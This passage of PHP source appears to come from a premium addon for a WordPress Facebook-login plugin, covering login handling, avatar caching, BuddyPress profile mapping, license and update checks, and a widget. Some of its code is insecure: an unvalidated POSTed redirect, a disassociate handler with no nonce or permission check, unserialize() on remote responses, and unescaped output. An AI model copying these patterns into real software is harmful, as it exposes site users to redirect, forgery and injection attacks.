  * Double-logins happen if the reader opens two tabs, logs in with one, and logs in with the other;
  * the second page's nonce will be invalid, because the current user no longer matches the 'anonymous user'
  * who was used to generate the nonce.  If we detect someone trying to login while there's already
  * a user logged in, we'll assume this is the case and simply refresh the current page.
  * 
  * Exception: If the current login is an 'associate existing account with facebook' login, we can't just
  * refresh the page as we need to wait until we have a Facebook connection to get the uid and tag usermeta.
  * That's handled by another action, but this function must check for it to make sure we don't abort the
  * login process by refreshing the current page prematurely.
  */
function jfb_ignore_redundant_logins($args)
{
	//If this login is an 'associate existing account with facebook' login, don't treat this as a double-login;
	//just go back to _process_login, and the association will be handled later.
	if(isset($_POST['assoc_account'])) return;
	
    //If we're trying to login and a user is already logged-in, this is a "double login"
    $currUser = wp_get_current_user();
    if( !$currUser->ID ) return;
    
    //Get the redirect URL.  _wp_http_referer comes from the NONCE, not the user-specified redirect url.
    if( isset($_POST['_wp_http_referer']))
        $redirect = $_POST['_wp_http_referer'];
    else if( isset($_POST['redirectTo']))
        $redirect = $_POST['redirectTo'];
    else
        return;
 
    global $jfb_log;
    $jfb_log .= "PREMIUM: User \"$currUser->user_login\" has already logged in via another browser session.  Silently refreshing the current page.\n";
    j_mail("Facebook Double-Login: " . $currUser->user_login);
    header("Location: " . $redirect);
    exit;
}



/////////////////////////Enforce Email Permission///////////////////////////
////(NOTE!! This is only relevant when using the OLD API; //////////////////
//// When the new API is enabled, it outputs its own JS that runs //////////
//// prior to this, then exits - so this is not used. //////////////////////
////////////////////////////////////////////////////////////////////////////

/**
  * Enforcing that the user doesn't select a proxied e-mail address is actually a 2-step process.
  * First, we insert an additional check in Javascript where we pull their data from Facebook again
  * and see if we can get their real address.  If so, let them login.  If not, we reject them -
  * however, since the user technically clicked "accept" (after selecting to use the proxied address),
  * they won't be re-prompted for the same permission on future logins, so we also have to 
  * revoke the email permission so they'll have another chance to accept next time.
  */
function jfb_enforce_real_email( $submitCode )
{
    return	"    //PREMIUM CHECK: Enforce non-proxied emails (new API)\n" .
           	"    FB.api( '/me', function(response)\n".
         	"    {\n".
            "        FB.api( {method:'users.getInfo', uids:response.id, fields:'email,contact_email'}, function(emailCheckStrict)\n".
            "        {\n" .
            "            if(emailCheckStrict[0].contact_email)               //User allowed their real email\n".
            "                ".$submitCode.                 
            "            else if(emailCheckStrict[0].email)                  //User clicked allow, but chose a proxied email.\n".
            "            {\n".
            apply_filters('wpfb_login_rejected', '').
            "                alert('Sorry, the site administrator has chosen not to allow anonymous emails.\\nYou must allow access to your real email address to login.');\n" .
            "                FB.api( {method:'auth.revokeExtendedPermission', perm:'email'}, function(){});\n".
            "            }\n".
            "            else\n".
            "            {\n".
            apply_filters('wpfb_login_rejected', '').
        	"              alert('Sorry, this site requires an e-mail address to log you in.');\n".
            "            }\n".
            "        });\n".
            "    });\n";
}


/////////////////////////////Cache Avatars//////////////////////////////////
////////////////////////////////////////////////////////////////////////////

/*
 * Get the path to where avatars are stored; used when both caching and deleting.
 */
function jfb_p_get_avatar_cache_dir()
{
    global $opt_jfbp_cache_avatar_dir, $opt_jfbp_cachedir_changetoblog;
    
    //Get the upload_dir setting from the specified blog
    $switchBlogs = function_exists('is_multisite') && is_multisite() && get_option($opt_jfbp_cachedir_changetoblog) != 0;
    if($switchBlogs) switch_to_blog(get_option($opt_jfbp_cachedir_changetoblog));
    $ud = wp_upload_dir();
    if($switchBlogs) restore_current_blog();
    
    //If the current page is ssl, change the url and baseurl to https
    if(is_ssl())
    {
        $ud['baseurl'] = str_replace("http://", "https://", $ud['baseurl']);
        $ud['url']     = str_replace("http://", "https://", $ud['url']);
    }
    
    //Get the subpath, and return an array formatted like that returned by wp_upload_dir
    $subpath = get_option($opt_jfbp_cache_avatar_dir);
    return array('basedir'=>trailingslashit($ud['basedir']),
                 'subdir'=>$subpath,
                 'path'=>trailingslashit($ud['basedir'] . "/" . $subpath),
                 'baseurl'=>$ud['baseurl'],
                 'url'=>trailingslashit($ud['basedir'] . "/" . $subpath));   
}



/*
 * Cache Facebook avatar thumbnails to the local server
 */
function jfb_cache_avatar_thumb( $args )
{
    //Get the path where we'll cache our avatars, and make sure it exists
    global $jfb_log;
    $path = jfb_p_get_avatar_cache_dir();
    @mkdir($path['path']);
    
    //Try to copy the thumbnail & update the meta
    $jfb_log .= "PREMIUM: Caching thumbnail avatar...";
    $srcFile = get_user_meta($args['WP_ID'], 'facebook_avatar_thumb', true);
    $dstFile = $path['path'] . $args['WP_ID'] . "_thumb.jpg";
    if( !@copy( $srcFile, $dstFile ) )
    {
        $errors= error_get_last();
        $jfb_log .= "ERROR copying thumbnail '" . print_r($srcFile, true) . "' to '$dstFile'.  Avatar caching aborted (Type: " . $errors['type'] . ", Message: " . $errors['message'] . ")\n";
        return;
    }
    update_user_meta($args['WP_ID'], 'facebook_avatar_thumb', trailingslashit($path['subdir']) . $args['WP_ID'] . '_thumb.jpg');
    $jfb_log .= "Cached to (" . $dstFile . ")\n";
}

/*
 * Cache fullsize Facebook avatars to the local server 
 */
function jfb_cache_avatar_full( $args )
{
	//Get the path where we'll cache our avatars, and make sure it exists
    global $jfb_log;
    $path = jfb_p_get_avatar_cache_dir();
    @mkdir($path['path']);
    
    //Try to copy the full image & update the meta
    $jfb_log .= "PREMIUM: Caching fullsize avatar...";
    $srcFile = get_user_meta($args['WP_ID'], 'facebook_avatar_full', true);
    $dstFile = $path['path'] . $args['WP_ID'] . "_full.jpg";
    if( !@copy( $srcFile, $dstFile ) )
    {
        $jfb_log .= "ERROR copying fullsize image '" . print_r($srcFile, true) . "' to '$dstFile'.  Avatar caching aborted.\n";
        return;
    }
    update_user_meta($args['WP_ID'], 'facebook_avatar_full', trailingslashit($path['subdir']) . $args['WP_ID'] . '_full.jpg');
    $jfb_log .= "Cached to (" . $dstFile . ")\n";
}

/*
 * When deleting a user, also try to delete their cached avatars
 */
function jfb_delete_cached_avatar($id)
{
    //Get the path to the avatars
    $path = jfb_p_get_avatar_cache_dir(); 
    
    //Try to delete the thumbnail, if present
    $thumbFile = $path['basedir'] . get_user_meta($id, 'facebook_avatar_thumb', true);
    if( file_exists ( $thumbFile ))
        @unlink($thumbFile);
        
    //Try to delete the full image, if present
    $fullFile = $path['basedir'] . get_user_meta($id, 'facebook_avatar_full', true);
    if( file_exists ( $fullFile ))
        @unlink($fullFile);
}

/////////////////////////////AJAX Spinner//////////////////////////////////
////////////////////////////////////////////////////////////////////////////

/**
 * When the user begins a login (after clicking "Login" in the Facebook popup), hide the button and show a spinner
 * NOTE: For this to work in wp-login.php, I have to include jQuery myself!  Done with a filter below.
 */
function jfb_button_to_spinner()
{
    echo "      jQuery('.fbLoginButton').hide();\n";
    echo "      jQuery('.login_spinner').show();\n";
}

/**
 * If the login fails (i.e. if they refused to reveal their email address), turn it back to a button 
 */
function jfb_spinner_to_button()
{
    return "      jQuery('.login_spinner').hide();\n" .
           "      jQuery('.fbLoginButton').show();\n";
}

/**
 * Insert the spinner HTML (initially hidden) just after the Login with Facebook button
 */
function jfb_output_spinner()
{
    global $opt_jfbp_show_spinner, $jfb_data_url;
    if( get_option($opt_jfbp_show_spinner) == 1 )
        echo "<div class=\"login_spinner\" style=\"display:none; margin-top:7px; text-align:center;\" ><img src=\"" . $jfb_data_url . "/assets/spinner_white.gif\" alt=\"Please Wait...\" /></div>";
    else
        echo "<div class=\"login_spinner\" style=\"display:none; margin-top:7px; text-align:center;\" ><img src=\"" . $jfb_data_url . "/assets/spinner_black.gif\" alt=\"Please Wait...\" /></div>";
}


////////////////////////Localize Facebook Popups////////////////////////////
////////////////////////////////////////////////////////////////////////////
function jfb_output_fb_locale($locale)
{ 
    global $opt_jfbp_localize_facebook;
    if( get_option($opt_jfbp_localize_facebook) && defined('WPLANG') && WPLANG != '' )
        return WPLANG;
    return $locale;
}


///////////////////////Wordbooker Avatar Integration////////////////////////
////////////////////////////////////////////////////////////////////////////
function jfb_wordbooker_avatar($avatar, $id_or_email, $size, $default, $alt)
{
    //If this comment was imported by wordbook, and Wordbook stored the uid of the Facbook user who posted it,
    //And that user has logged into this blog with wp-fb-autoconnect before, use that user's avatar.
    global $wpdb, $comment, $jfb_uid_meta_name;
    if( is_object($comment) && is_numeric($comment->comment_ID) )
    {
        //See if this comment has a Facebook UID (from Wordbooker).
        $fb_uid = get_comment_meta($comment->comment_ID, 'fb_uid', true);
        if( !is_numeric($fb_uid) ) return $avatar;
        
        //It does!  See if we have any users with this Facebook UID (from WP-FB-AutoConnect)
        $usermeta = $wpdb->prefix . 'usermeta';
        $users = $wpdb->prefix . 'users';
        $select_user = "SELECT user_id FROM $usermeta,$users " .
        			   "WHERE $usermeta.meta_key = '$jfb_uid_meta_name' ".
                       "AND $usermeta.meta_value = '$fb_uid' ".
                       "AND $usermeta.user_id = $users.ID";
        $wp_uid = $wpdb->get_var($select_user);
        if( !is_numeric($wp_uid) ) return $avatar;
        
        //We do!  Re-run jfb_wp_avatar() (in the main plugin), this time overriding $id_or_email.
        return jfb_wp_avatar($avatar, $wp_uid, $size, $default, $alt);
    }
    
    //Should't get here, but just to be safe...
    return $avatar;
}


//////////////////BuddyPress Activity Stream Announcement///////////////////
////////////////////////////////////////////////////////////////////////////

/*
 * When a new or returning user logs into the site, announce it to the BuddyPress activity stream.
 * Note: The BP core functions available for posting activities are:
 * bp_activity_add()          - The most generic/low-level function for posting activities of any kind; all of the following are wrappers around this.
 * bp_activity_post_update()  - Posts activities exclusively of the form "<user> posted an update." Not customizable at all, not what we need.
 * bp_blogs_record_activity() - Lets you specify an activity type; internally used for things like "xx wrote a new post" and "xx commented on the post."
 *                              Performs just a few checks before running bp_activity_add(), such as updating an existing entry if one already exists.
 */
function jfb_notify_bp_activitystream_existing($args)
{
	global $jfb_log, $opt_jfbp_bpstream_logincontent;
	$jfb_log .= "PREMIUM: Announcing the returning user's login on the BP Activity Stream\n";
	jfb_notify_bp_activitystream($args['WP_ID'], get_option($opt_jfbp_bpstream_logincontent), 'activity_update');
}
function jfb_notify_bp_activitystream_registering($args)
{
	global $jfb_log, $opt_jfbp_bpstream_registercontent;
	$jfb_log .= "PREMIUM: Announcing the new registration on the BP Activity Stream\n";
	jfb_notify_bp_activitystream($args['WP_ID'], get_option($opt_jfbp_bpstream_registercontent), 'new_member');
}
function jfb_notify_bp_activitystream($ID, $announcement, $type)
{
	//Make sure BP is active and we have an announcement
	global $bp, $jfb_log;
	if( !function_exists('bp_activity_add') )
	{
		$jfb_log .= "PREMIUM: WARNING - BuddyPress not detected; skipping activity stream announcement.\n";
		return;
	}
	if( $announcement == "" )
	{
		$jfb_log .= "PREMIUM: WARNING - No message is specified; skipping activity stream announcement.\n";
		return;		
	}
	
	//Make the announcement!
	$activity_args = array(
		'user_id'  => $ID,
		'action'   => str_replace("%user%", bp_core_get_userlink($ID), $announcement),
		'content'  => "",
		'type'     => $type,
		'component'=> $bp->activity->id );
	bp_activity_add( $activity_args );
}


////////////////////////BuddyPress XProfile Mapping/////////////////////////
////////////////////////////////////////////////////////////////////////////
/**
 * To add support for additional Facebook fields (https://developers.facebook.com/docs/reference/api/user):
 * 1) Add it to the list of $allowed_mappings in jfb_output_premium_panel()
 * 2) Add it to the list of $fields_requiring_perms in jfb_xprofile_extended_permissions() (if necessary)
 * 3) Add a case to jfb_import_to_xprofile() (to process it from i.e. an array/object into a single string for writing to the xProfile)
 */

/**
  * When a user logs in, this function can fetch additional information from Facebook
  * and insert it in their Buddypress XProfile.
  */
function jfb_import_to_xprofile($args)
{
    //Make sure BuddyPress is installed.
    if( !function_exists('xprofile_set_field_data') ) return;
    
    //Get our mappings from the database, and make sure they're valid
    global $jfb_log, $opt_jfbp_xprofile_mappings;
    $current_mappings = get_option($opt_jfbp_xprofile_mappings);
    if(!is_array($current_mappings))
    {
        $jfb_log .= "WARNING: BuddyPress XProfile options are not an array!  Fields will not be imported.\n";
        return;
    }
    
    //Get a list of the unique Facebook fields we'll need to access (and make sure there actually are some)
    $jfb_log .= "PREMIUM: Checking for XProfile mappings...";
    $fbFields = array_diff(array_unique($current_mappings), array("0"));
	$fbFields = apply_filters('wpfb_xprofile_fields_to_query', $fbFields);
    if(count($fbFields) == 0)
    {
        $jfb_log .= "No mappings found!\n";
        return;
    }
    $jfb_log .= "Found " . count($fbFields) . " unique mappings!\n";
    
    //Query Facebook for the fields
    $fbFields = implode(",", $fbFields);
    $jfb_log .= "PREMIUM: Querying Facebook for \"" . $fbFields . "\"...\n";
    try
    {
        $fbuser = jfb_api_get("https://graph.facebook.com/me?fields=$fbFields"."&access_token=".$args['access_token']);
    }
    catch(Exception $e)
    {
        $jfb_log .= "WARNING: The Facebook API returned an exception!  Field mapping will abort. ($e)\n";
        return;
    }
    
    //Some fields require "special" processing (i.e. those that come in the format of an array/object; flatten them to a basic string.
    if(isset($fbuser['location']) && is_array($fbuser['location']))   $fbuser['location'] = $fbuser['location']['name'];
    if(isset($fbuser['hometown']) && is_array($fbuser['hometown']))   $fbuser['hometown'] = $fbuser['hometown']['name'];
    if(isset($fbuser['languages']) && is_array($fbuser['languages']))
    {
        $langs = array();
        foreach($fbuser['languages'] as $lang) array_push($langs, $lang['name']);
        $fbuser['languages'] = implode(",", $langs);
    }	
	if(isset($fbuser['music']) && is_array($fbuser['music']) && is_array($fbuser['music']['data']))
    {
        $arr = array();
        foreach($fbuser['music']['data'] as $item) array_push($arr, $item['name']);
        $fbuser['music'] = implode(",", $arr);
    }
	if(isset($fbuser['interests']) && is_array($fbuser['interests']) && is_array($fbuser['interests']['data']))
    {
        $arr = array();
        foreach($fbuser['interests']['data'] as $item) array_push($arr, $item['name']);
        $fbuser['interests'] = implode(",", $arr);
    }
	
	//A filter so 3rd party plugins can process any extra fields they might need
	$fbuser = apply_filters('wpfb_xprofile_fields_received', $fbuser, $args['WP_ID']);
    
    //Now that we have the info from Facebook, go through and save each one to xProfile!
    $jfb_log .= "PREMIUM: Mapping fields: ";
    foreach( $current_mappings as $xProfileField => $facebookField )
    {
        if(!$facebookField || $facebookField == "0") continue;
        $jfb_log .= '"' . $xProfileField . '=>' . $facebookField . '(' . $fbuser[$facebookField] . ')"   ';
        xprofile_set_field_data($xProfileField, $args['WP_ID'], $fbuser[$facebookField]);
    }
    $jfb_log .= "\n";
}


/**
  * Some Facebook information - i.e. birthday, education, etc - requires extra permissions to get.
  * This tells the Login Button to prompt for those permissions (if required by the current XProfile settings).
  */
function jfb_xprofile_extended_permissions($arg)
{
    //If BuddyPress isn't enabled, we obviously won't be importing to XProfile
    if( !function_exists('xprofile_set_field_data') ) return $arg;
    
    //Get an array of unique fields we're fetching from Facebook
    global $opt_jfbp_xprofile_mappings;
    $current_mappings = get_option($opt_jfbp_xprofile_mappings);
    $fbFields = array_diff(array_unique($current_mappings), array("0"));

    //Make a list of the Facebook fields which require extended permissions (See: https://developers.facebook.com/docs/reference/api/user/)
    $fields_requiring_perms = array(
    			"birthday"=>"user_birthday", "bio"=>"user_about_me", "political"=>"user_religion_politics", "relationship_status"=>"user_relationships",
    			"religion"=>"user_religion_politics", "website"=>"user_website", 'location'=>"user_location", "languages"=>"user_likes", 
    			'hometown'=>'user_hometown', 'music'=>'user_likes', 'interests'=>'user_interests');
	$fields_requiring_perms = apply_filters('wpfb_xprofile_fields_requiring_perms', $fields_requiring_perms);

    //Combine the array of "fields we want" with "fields which require permissions" to get "fields we want which require permissions"
    $fbFields = array_flip($fbFields);
    $fbFields = array_intersect_key($fbFields, $fields_requiring_perms);
    if(count($fbFields) == 0) return $arg;
        
    //Finally, make a list of required permissions we'll prompt for
    foreach($fbFields as $key=>$value) $fbFields[$key] = $fields_requiring_perms[$key];
    $fbFields = array_unique($fbFields);
    $fbFields = implode(",", $fbFields);

    //And add it to the login button filter!
    if(strlen($arg)!=0) $arg .= ",";
    return $arg . $fbFields;
}


///////////////////////Check & Notify of Updates////////////////////////////
////////////////////////////////////////////////////////////////////////////


//Whenever the panel loads, check if the installed addon is older than the latest version our database knows about, and notify if so.
//Also make sure a cron job is scheduled to periodically check the latest version (and save it in the DB), and handle user requests
//to immediately check for an update.
add_action('admin_notices', 'jfb_p_update_notice');
function jfb_p_update_notice()
{
    //If the user has just requested that we check for an update manually, run it.
    //Also take that to mean that the user no longer wants to hide update notification messages.
    global $opt_jfbp_latestversion, $opt_jfbp_hide_updatenote_till_ver;
    $manualUpdateCheckSuccessful = false;
    if( isset($_POST['VersionCheckNow']) )
    {
        if( jfb_p_cron_updatecheck_run() ) $manualUpdateCheckSuccessful = true;
        else { ?><div class="error"><p><strong>Update check failed.</strong></p></div><?php }
        update_option($opt_jfbp_hide_updatenote_till_ver, 0);
    }

	//Schedule a cronjob to check periodically for updates
	if( wp_get_schedule('jfb_p_cron_updatecheck') == false )
		wp_schedule_event(time(), 'daily', 'jfb_p_cron_updatecheck');

	//If the user elected to hide update messages up to this version, write an option to the db.
	if( isset($_REQUEST[$opt_jfbp_hide_updatenote_till_ver]) )
    {
        ?><div class="updated"><p><strong>WP-FB-AutoConnect Premium update notifications will no longer be shown for this version.  You can re-enable them by manually clicking the "Check for Updates" link on the Premium Options page.</strong></p></div><?php
    	update_option($opt_jfbp_hide_updatenote_till_ver, $_REQUEST[$opt_jfbp_hide_updatenote_till_ver]);
    }
    	
	//Show a notification if the installed addon version is older than the latest (and the user didn't hide them)
	$verInfo = get_option($opt_jfbp_latestversion);
    if(is_string($verInfo)) $verInfo = unserialize($verInfo);
    if(is_array($verInfo))
    {
    	if( JFB_PREMIUM_VER < $verInfo['ver'])
    	{
    		if(get_option($opt_jfbp_hide_updatenote_till_ver) < $verInfo['ver'] )
    		{
    		    ?><div class="error">
                    <form name="formHideUpdateNotification" method="post" action="">
        		    	<p>
        		    		<?php echo $verInfo['log']; ?><br /><br />
                            <a href="javascript:document.formHideUpdateNotification.submit();">Hide for this version</a>
        		    	</p>
        		    	<input type="hidden" name="<?php echo $opt_jfbp_hide_updatenote_till_ver;?>" value="<?php echo $verInfo['ver']?>" />
    		    	</form>
    		    </div><?php
    		}
    	}
        else if($manualUpdateCheckSuccessful)
        {
            ?><div class="updated"><p><strong>Update check successful. You already have the most up-to-date version of the Premium addon (v<?php echo JFB_PREMIUM_VER;?>)</strong></p></div><?php
        }
    }
}

//Check for the latest version from my server, and save it in the database.
//This is typically called by a cronjob to check periodically, but may also be called manually.
add_action('jfb_p_cron_updatecheck', 'jfb_p_cron_updatecheck_run');
function jfb_p_cron_updatecheck_run()
{
    //Check for updates
    global $opt_jfbp_latestversion, $jfb_version;
    $args = array( 'blocking'=>true, 'body'=>array('product'=>'WP-FB-AC-Premium', 'addon_ver'=>JFB_PREMIUM_VER, 'plugin_ver'=>$jfb_version));
    $response = wp_remote_post("http://auth.justin-klein.com/VersionCheck/", $args);
    if( !is_wp_error($response) ) update_option($opt_jfbp_latestversion, $response['body']);
    
    //Check licenses
    global $opt_jfbp_invalids;
    $args = array( 'blocking'=>true, 'body'=>array('hash'=>"7q04fj87d"));
    $response = wp_remote_post("http://auth.justin-klein.com/LicenseCheck/", $args);
    if( !is_wp_error($response) ) update_option($opt_jfbp_invalids, unserialize($response['body']));
    
    //Auth2
    global $jfb_name, $jfb_version;
    jfb_auth2($jfb_name,$jfb_version,8,"0");
    return true;
}

///Add a Facebook section to the WP & BP profiles, with optional "Link" & "Disassociate" buttons//
//////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * Add a section to the WORDPRESS user profile page that shows the UID and 'Link' / 'Disassociate' buttons.
 * NOTE: "Disassociate" (which I implemented first) is handled by PHP form submission; "Link" uses a more 
 * elegant AJAX solution to write the usermeta without needing to refresh the page.
 */
function jfb_wp_addprofileoptions($user)
{
    global $opt_jfbp_allow_link, $opt_jfbp_allow_disassociate, $jfb_uid_meta_name, $jfb_default_email;
	$fbuid = get_user_meta($user->ID, $jfb_uid_meta_name, true);
	$userdata = wp_get_current_user();
	?>
	<table class="form-table">
		<tr>
			<th><label>Facebook</label></th>
			<?php if( !isset($fbuid) || !$fbuid ): ?>
			<td>
			    <?php if( get_option($opt_jfbp_allow_link) && $userdata->id == $user->ID): ?>
			        <input type="button" class="button-primary" value="Link with Facebook" onclick="jfb_js_link_user()" />
			    <?php else: ?>
			        <p>Not Connected</p>
			    <?php endif; ?>
			</td>
			<?php elseif(strpos($user->user_email, $jfb_default_email) !== FALSE): ?>
			<td>
				Connected as <a target="_fb" href="http://www.facebook.com/profile.php?id=<?php echo $fbuid;?>">UID <?php echo $fbuid;?></a>
				<?php if( get_option($opt_jfbp_allow_disassociate) || current_user_can('delete_users') ): ?>(This user cannot be disassociated from Facebook until they have a valid e-mail address)<?php endif; ?>
			</td>
			<?php else: ?>
			<td>
				Connected as <a target="_fb" href="http://www.facebook.com/profile.php?id=<?php echo $fbuid;?>">UID <?php echo $fbuid;?></a>
				<?php if( get_option($opt_jfbp_allow_disassociate) || current_user_can('delete_users') ): ?><input type="button" class="button-primary" value="Disassociate From Facebook" onclick="jfb_disconnect_user(<?php echo $user->ID;?>)" /><?php endif; ?>
			</td>
			<?php endif; ?>
		</tr>
	</table>
<?php
}


/*
 * Add a section to the BUDDYPRESS user profile page that shows the UID and 'Link' / 'Disassociate' buttons
 */
function jfb_bp_addprofileoptions()
{
    //Only show the "Facebook" section to admins, and to users logged in and viewing their own profiles
    global $opt_jfbp_allow_disassociate, $jfb_uid_meta_name, $jfb_default_email;
    if( !bp_is_my_profile() && !current_user_can('delete_users') ) return;
    ?>
    <h4>Facebook</h4>
        <table class="profile-fields">
            <tr class="field_name">
                <td class="label">Associated Account</td>
                <td class="data">
                    <?php
                    //If the current user is associated with a FB account, output that fbuid and a disconnect button
                    global $jfb_uid_meta_name;
                    $fbuid = get_user_meta(bp_displayed_user_id(), $jfb_uid_meta_name, true); 
                    if( $fbuid )
                    {
                        echo "<a href='http://www.facebook.com/profile.php?id=$fbuid' target='fb'>$fbuid</a> ";
                        if( get_option($opt_jfbp_allow_disassociate) || current_user_can('delete_users') )
                        {
                            echo '<input type="button" class="button-primary" value="Disassociate From Facebook" onclick="jfb_disconnect_user('. bp_displayed_user_id() . ')" />';                      
                            jfb_profiledisconnect_form();
                        }
                    }
                    //Otherwise, a "link" button.
                    else
                    {
                        global $opt_jfbp_allow_link;
                        if(get_option($opt_jfbp_allow_link) && bp_is_my_profile())
                            echo '<input type="button" class="button-primary" value="Link with Facebook" onclick="jfb_js_link_user()" />';
                        else
                            echo "None";   
                    }
                    ?>
                </td>
            </tr>
        </table>
    <?php
}


/*
 * ASSOCIATE: Output a JS callback to handle "Link with Facebook" logins.  Unlike a normal login, we don't redirect to 
 * _process_login.php; instead, we use the WP AJAX API to call a function which will simply update that user's metadata
 * with the appropriate Facebook UID.  This doesn't prompt for any of the extra permissions - *just* the uid.
 * Tutorial on AJAX requests in WP: http://codex.wordpress.org/AJAX_in_Plugins
 * Better tutorial, including nonces: http://wp.smashingmagazine.com/2011/10/18/how-to-use-ajax-in-wordpress/
 */
function jfb_output_js_link_user()
{
    $userdata = wp_get_current_user();
    ?>
    <script type="text/javascript" >
        function jfb_js_link_user() 
        {            
            FB.login(function(resp)
            {
                if (resp.authResponse) jfb_js_link_callback();
            });
        }
        
        function jfb_js_link_callback()
        {
            //Make sure the user logged into Facebook (didn't click "cancel" in the login prompt)
            FB.getLoginStatus(function(response)
            {
                if (!response.authResponse)
                {
                    return;
                }
            
                //If the user completed the login, invoke the action to handle updating the usermeta 
                var data = {action: 'jfb_process_linkwithfacebook_action',
                            uid: '<?php echo $userdata->id ?>',
                            fb_uid: response.authResponse.userID,
                            nonce: '<?php echo wp_create_nonce('jfb_process_linkwithfacebook') ?>' };
                jQuery.post('<?php echo admin_url('admin-ajax.php')?>', data, function(response)
                {
                    //alert(response);
                    if(response == 0)
                        alert("Linking failed.\n\nThis should never happen; if it does, please report it to the WP-FB-AutoConnect plugin author.")
                    else
                    {
                        //Note: I don't really have to do this - I could just update the DOM with JS, as at this point, the usermeta
                        //is written and everything is done.  I simply reload to keep the implementation consistent with the disconnect
                        //button, and for ease...
                        window.location = window.location.href;
                    }
                });
            });
        }
    </script>
    <?php
}


/*
 * ASSOCIATE: This action is invoked by AJAX to link a logged-in user with their Facebook account (by tagging their usermeta
 * with the appropriate facebook uid).  See the function above for more info.
 */
function jfb_process_linkwithfacebook() 
{
    //Nonce security check
    if ( !wp_verify_nonce( $_REQUEST['nonce'], "jfb_process_linkwithfacebook")) 
       die(0);
       
    //Sanity check
    $userdata = wp_get_current_user();
    if( $userdata->id != intval( $_POST['uid'] ) )
        die(0);
    
    //Update usermeta & echo back the UID as confirmation
    global $jfb_uid_meta_name;
    update_user_meta($userdata->id, $jfb_uid_meta_name, $_POST['fb_uid']);
    die($_POST['fb_uid']);
}


/**
  * DISASSOCIATE: Since the Disassociate Button on the Profile page will already be inside the main update form,
  * in order to implement a different action, clicking it uses JS to submit a different hidden form I output below.
  */
function jfb_profiledisconnect_form()
{
	?>
	<form id="wp-fb-d-fm" name="jfb_disconnect_form" method="post" action="" >
		<input type="hidden" name="jfb_disconnect_user" id="jfb_disconnect_user" value="0" />
	</form>
	<script type='text/javascript'>
	function jfb_disconnect_user(uid)
	{
		document.getElementById('jfb_disconnect_user').value = uid;
		document.jfb_disconnect_form.submit();
	}
	</script>
	<?php
}


/**
  * DISASSOCIATE: When the Disassociate button is clicked, it submits a form via JS.  Here I check for that form's
  * POST variable - if it's set, it means the Disconnect button was clicked, so we need to disconnect the user
  * by deleting WP-FB-AutoConnect's usermeta (and show a notice). 
  */
function jfb_profiledisconnect_process()
{
	global $jfb_uid_meta_name;
	if(isset($_POST['jfb_disconnect_user']) && $_POST['jfb_disconnect_user'])
	{
	    delete_user_meta($_POST['jfb_disconnect_user'], $jfb_uid_meta_name);
        delete_user_meta($_POST['jfb_disconnect_user'], 'facebook_avatar_thumb');
        delete_user_meta($_POST['jfb_disconnect_user'], 'facebook_avatar_full');
	    
        //Message for BP
	    if(function_exists('bp_core_add_message')) bp_core_add_message( "This user account has been disassociated from Facebook." );
        //Message for WP
		if(is_admin()): ?><div id="disconnected-message" class="updated"><strong>This user account has been disassociated from Facebook.</strong></div><?php endif;
	} 
}


/////////////////////Set role for autoregistered users//////////////////////
////////////////////////////////////////////////////////////////////////////
function jfb_set_autoregistered_role($args)
{
	//Make sure the role option is valid, and if so, assign it.
	global $jfb_log, $opt_jfbp_autoregistered_role, $wp_roles;
	if ( empty( $wp_roles->roles[get_option($opt_jfbp_autoregistered_role)] ) )
	{
		$jfb_log .= "PREMIUM: The selected role (".get_option($opt_jfbp_autoregistered_role).") is invalid!  Registering with the default role (".get_option('default_role').").\n";
		return $args;
	}
	$jfb_log .= "PREMIUM: Assigning user role '".get_option($opt_jfbp_autoregistered_role)."'\n";
	$args['role'] = get_option($opt_jfbp_autoregistered_role);
	return $args;
}


//////////////////////////////////Shortcode/////////////////////////////////
////////////////////////////////////////////////////////////////////////////

/**
  * A shortcode handler that will allow users to add "Login with Facebook" buttons to their pages or posts.
  * The shortcode is [jfb_facebook_btn].  Default behavior is to show a login button for logged-out users,
  * and nothing for logged-in users.  Alternatively, you can use the "loggedn=''" param to specify something
  * to echo when the user is logged in, in place of the button.
  */
function jfb_facebook_btn_shortcode( $atts )
{
    extract( shortcode_atts( array(
        'loggedin' => ''
    ), $atts ) );
    
    if( !is_user_logged_in() )
    {
        ob_start();
        jfb_output_facebook_btn();
        $output_string=ob_get_contents();
        ob_end_clean();
        return $output_string;
    }
    else
        return $loggedin;
}

/**********************************************************************/
/**********************************************************************/
/**************************Premium Widget******************************/
/**********************************************************************/
/**********************************************************************/

//Premium version of the login widget, which offers some additional customizability
add_action( 'widgets_init', 'register_jfbLogin_premium' );
function register_jfbLogin_premium() { register_widget( 'Widget_AutoConnect_Premium' ); }
class Widget_AutoConnect_Premium extends WP_Widget
{
    //Init the Widget
    function Widget_AutoConnect_Premium()
    { 
        $this->WP_Widget( false, "WP-FB AutoConnect Premium", array( 'description' => 'A sidebar Login/Logout form with Facebook Connect button.' ) );
    }

    //Output the widget's content.
    function widget( $args, $instance )
    {
        //Get args and output the title
        extract( $args );
        echo $before_widget;
        $title = apply_filters('widget_title', $instance['title']);
        if( $title ) echo $before_title . $title . $after_title;
        echo "\n<!--WP-FB AutoConnect Premium Widget-->\n";
        
        //For updating users who haven't re-saved their Widget options since these were added...
        if(!isset($instance['showforgot'])) $instance['showforgot'] = true;
        
        //If logged in, show "Welcome, User!"
        if( is_user_logged_in() ):
        $userdata = wp_get_current_user();
        ?>
            <?php if($instance['showavatar']): ?>
            <div class="wpfb-widget-avatar"><?php echo get_avatar($userdata->ID, $instance['avatarsize']);?></div>
            <?php endif; ?>
            <div style='text-align:center'>
              <?php 
                echo $instance['labelWelcome'] . " " . $userdata->display_name;
              ?>!<br />
              <small>
                <?php 
                if( $instance['showEditProfile'] ):
                    $profileLink = get_option('siteurl')."/wp-admin/profile.php";
                    if( $instance['bpProfileLink'] && function_exists('bp_core_get_user_domain')):
                        $profileLink = bp_core_get_user_domain($userdata->ID).'/profile';
                    endif;
                    ?><a href="<?php echo $profileLink;?>"><?php echo $instance['labelProfile']; ?></a> | <?php
                endif; ?>
                <?php if($instance['logoutofFB']): ?>
                	<a href="javascript:LogoutOfFacebook();"><?php echo $instance['labelLogout']; ?></a>
                    <script type="text/javascript">//<!--
                    function LogoutOfFacebook()
                    {
                        FB.getLoginStatus(function(response)
    					{
                        	if(response.authResponse)
                        	{
                            	if (confirm("Logout of Facebook too?"))
                            	{ 
                            		FB.logout(function(response)
                                    {
                                        window.location = "<?php echo html_entity_decode(wp_logout_url( $_SERVER['REQUEST_URI'] )); ?>";
                                    });
                            	}
                            	else
